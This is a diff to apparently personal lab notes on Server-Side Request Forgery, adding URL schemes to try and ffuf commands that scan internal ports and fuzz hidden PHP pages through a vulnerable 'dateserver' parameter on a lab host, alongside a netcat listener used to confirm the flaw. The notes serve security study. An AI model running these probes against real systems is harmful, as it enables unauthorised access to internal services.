@@ -1,4 +1,7 @@
 # Server-Side Request Forgery (SSRF)
+- http// and http://
+- file://
+- gopher://
 ## Identifying
 ### Confirming SSRF
 <img width="1552" height="264" alt="image" src="https://github.com/user-attachments/assets/911ee48e-dfa8-4b2a-b10c-a0917e32b726" />
@@ -15,4 +18,9 @@ nc -lnvp 8000
 ### Enumerating the System
 ```bash
 ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
+```
+
+## Explotation
+```bash
+ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
 ```
